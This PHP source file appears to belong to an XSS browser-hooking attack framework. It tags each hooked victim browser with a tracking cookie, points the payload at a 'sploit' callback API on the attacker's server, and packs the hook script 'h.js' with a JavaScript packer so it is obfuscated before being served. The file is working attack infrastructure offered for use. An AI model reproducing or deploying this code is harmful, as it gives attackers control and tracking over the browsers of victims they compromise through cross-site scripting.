<?php
require("../config.php");

// figure out the id for the hooked browser.   if we don't have one, create one
if (isset($_COOKIE['xssid'])) {
	$id = $_COOKIE['xssid'];
}
// no cookie?  maybe a get/post param?
else {
	if (isset($_REQUEST['id']))
		$id = $_REQUEST['id'];
	// nothing, create an id
	else
		$id = preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
	// try to store the id
	setcookie("xssid", $id, 0, "/");
}

// the header has parameters custom to this server (server callbacks, etc)
$header = "var sploit = '{$_SERVER['HTTP_HOST']}';\n" .
$header .= "var sploitapi = 'http://{$_SERVER['HTTP_HOST']}/api.php';\n";

// since the sploitid is custom to each hooked browser, we can't cache that
// this will be dumped onto each new h.php call
echo "var sploitid = '$id';\n";

// the obfuscated file
if (OBFUSCATE_JS) {
	$obfile = OBFUSCATE_DIR . "h.js";
	// stat both to find out the last modification time
	$st1 = stat($obfile);
	$st2 = stat("h.js");
	// if obfuscated file does not exist, or modification time is < orig
	if (!file_exists($obfile) || $st1['mtime'] < $st2['mtime']) {
		require '../packer/class.JavaScriptPacker.php';
		$script = file_get_contents("h.js");
		$packer = new JavaScriptPacker($header.$script, 'Normal', true, false);
		$packed = $packer->pack();
		$p2 = preg_replace("/;/", ";\n", $packed);
		file_put_contents($obfile, $p2);
		//file_put_contents($obfile, $header.$script);
	}
	// include the obfuscated file (this should usually be cached)
	include $obfile;
}
// no obfuscation, just include the original
else {
	echo $header;
	include "h.js";
}
?>
